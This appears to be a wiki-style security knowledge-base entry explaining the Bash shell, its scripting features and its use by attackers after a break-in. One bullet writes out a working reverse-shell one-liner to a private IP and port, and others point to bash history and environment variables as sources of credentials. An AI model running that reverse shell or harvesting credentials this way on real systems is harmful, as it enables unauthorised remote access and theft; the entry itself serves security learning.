# Bourne Again SHell (Bash)

Bourne Again SHell (Bash) is a Unix shell and command language that serves as the default interactive shell on most Linux distributions and macOS. It is both a command interpreter for interactive use and a scripting language for automating tasks. Bash is a replacement for the original Bourne Shell (sh), extending it with additional features and improvements while maintaining backward compatibility.

- **Command interpreter:** Bash reads and executes commands entered interactively by a user or supplied from a script file. It handles process execution, I/O redirection, piping, and job control, forming the primary interface between a user and the operating system kernel.
- **Scripting:** Bash scripts are plaintext files containing sequences of commands, control flow structures, and logic. They are widely used for automating system administration tasks, building tooling, and chaining together programs — as seen in tools like the nftables backup script above.
- **Variables and environment:** Bash manages shell variables and environment variables, which are passed to child processes. Variables like `PATH`, `HOME`, and `HISTFILE` control shell and system behavior. Sensitive values such as API keys and passwords are commonly stored in environment variables to keep them out of scripts.
- **Pipelines and redirection:** Bash supports chaining commands with pipes (`|`), redirecting output to files (`>`), appending (`>>`), and reading from files (`<`). This composability is central to Unix philosophy — small tools chained together to accomplish complex tasks.
- **Control flow:** Bash supports conditionals (`if`, `case`), loops (`for`, `while`, `until`), and functions, enabling complex logic within scripts. Error handling constructs like `set -euo pipefail` enforce strict execution, stopping scripts on unexpected failures.
- **History and readline:** Bash maintains a history of commands in `~/.bash_history` and supports interactive search with `Ctrl+R`. From an offensive perspective, command history is a valuable source of intelligence during post-exploitation — credentials, internal hostnames, and operational patterns are frequently found there.
- **Offensive relevance:** Bash is a primary tool for post-exploitation on Linux systems. Once access is obtained, bash one-liners are used for enumeration, persistence, and lateral movement. Reverse shells are commonly written in bash due to its near-universal availability on Linux hosts: `bash -i >& /dev/tcp/192.168.1.1/4444 0>&1`
- **Privilege escalation:** Misconfigured bash scripts running as root, writable scripts in cron jobs, and SUID binaries that invoke bash are common privilege escalation vectors. The bash history file and poorly handled environment variables also frequently leak credentials.

Bash's ubiquity on Linux systems makes it both an essential tool for administrators and a reliable resource for attackers, making a deep understanding of its behavior valuable from both sides of the fence.

---

See also:

- [[bourne_shell_(sh)]]
- [[interpreter]]
- [[environment_variable]]
- [[reverse_shell]]
- [[privilege_escalation]]
